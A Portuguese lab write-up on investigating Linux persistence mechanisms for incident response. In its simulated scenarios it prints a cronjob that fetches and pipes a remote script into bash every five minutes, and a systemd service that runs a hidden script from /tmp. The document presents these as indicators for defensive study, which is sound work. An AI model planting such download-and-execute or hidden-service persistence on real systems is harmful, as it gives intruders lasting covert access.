# Investigação de Persistência em Linux

## Visão Geral

Este laboratório teve como foco a identificação e investigação de mecanismos de persistência comumente utilizados após o comprometimento de um sistema Linux.

O objetivo foi entender como invasores mantêm acesso contínuo ao sistema mesmo após o encerramento do processo malicioso inicial ou da reverse shell.

---

# Tópicos Abordados

* Conceitos de persistência em Linux
* Persistência via cronjob
* Serviços maliciosos no systemd
* Persistência de reverse shell
* Execução automática em Linux
* Investigação de serviços suspeitos
* Análise comportamental de atividades maliciosas
* Diretórios Linux associados à persistência
* Técnicas seguras de inspeção de payloads

---

# Ferramentas Utilizadas Durante a Investigação

* `crontab` → inspeção de tarefas agendadas e execuções automáticas
* `systemctl` → investigação e análise de serviços Linux
* `ps aux` → análise de processos ativos
* `pstree` → visualização da relação entre processos pai e filho
* `ss -tunap` → investigação de conexões de rede ativas
* `curl` → coleta e análise controlada de payloads
* `cat` / `less` → inspeção de scripts e arquivos suspeitos

---

# Principais Aprendizados

* A persistência permite que invasores recuperem acesso sem precisar reinvadir o sistema
* `cron` e `systemd` são vetores comuns de persistência em ambientes Linux
* `curl URL | bash` é extremamente perigoso porque executa código remoto imediatamente
* `curl -O URL` é mais seguro para análise forense porque apenas realiza o download do arquivo
* Contexto e comportamento são mais importantes do que comandos isolados
* Diretórios temporários como `/tmp` podem indicar atividade suspeita quando associados a serviços ou scripts

---

# Fluxo de Investigação

1. Identificar comportamento suspeito
2. Investigar mecanismos de execução automática
3. Analisar cronjobs e serviços
4. Coletar evidências com segurança
5. Inspecionar scripts suspeitos sem executá-los
6. Investigar processos e conexões de rede
7. Conter mecanismos de persistência
8. Remover artefatos maliciosos

---

# Cenários Simulados de Persistência

## Cronjob Suspeito

```bash
*/5 * * * * curl http://198.51.100.23/p.sh | bash
```

### Análise

* Executa a cada 5 minutos
* Baixa conteúdo remoto
* Executa o payload automaticamente
* Possível mecanismo de persistência para malware ou reverse shell

---

## Serviço Suspeito no systemd

```text
ExecStart=/tmp/.sysupd/update.sh
```

### Indicadores de Atividade Suspeita

* Execução a partir de `/tmp`
* Diretório oculto (`.sysupd`)
* Script shell desconhecido
* Serviço projetado para persistir após reinicialização

---

# Conclusão

Este laboratório reforçou a importância de compreender mecanismos de persistência em ambientes Linux.

O processo de investigação demonstrou como invasores podem automatizar a execução de payloads utilizando cronjobs e serviços systemd, além de mostrar como analistas podem identificar, investigar e analisar esses mecanismos com segurança durante atividades de resposta a incidentes.
